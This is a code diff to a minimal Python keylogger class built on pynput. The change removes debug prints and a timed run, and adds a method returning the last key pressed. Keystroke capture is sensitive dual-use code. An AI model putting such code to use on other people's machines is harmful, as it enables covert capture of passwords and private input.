@@ -16,8 +16,6 @@ from pynput import keyboard
 #     listener.start()
 #     input()
 
-import time
-
 class Keylogger:
     def __init__(self):
         self.key = ""
@@ -26,19 +24,14 @@ class Keylogger:
     def start(self):
         self.listener = keyboard.Listener(on_press=self.log)
         self.listener.start()
-        print("listener started....")
 
     def log(self, key):
-        print(key)
+        self.key = key
+        self.get()
 
     def stop(self):
-        print("listener stopped....")
         self.listener.stop()
         self.listener = None
 
-
-keylogger = Keylogger()
-keylogger.start()
-time.sleep(15)
-keylogger.stop()
-
+    def get(self):
+        return self.key
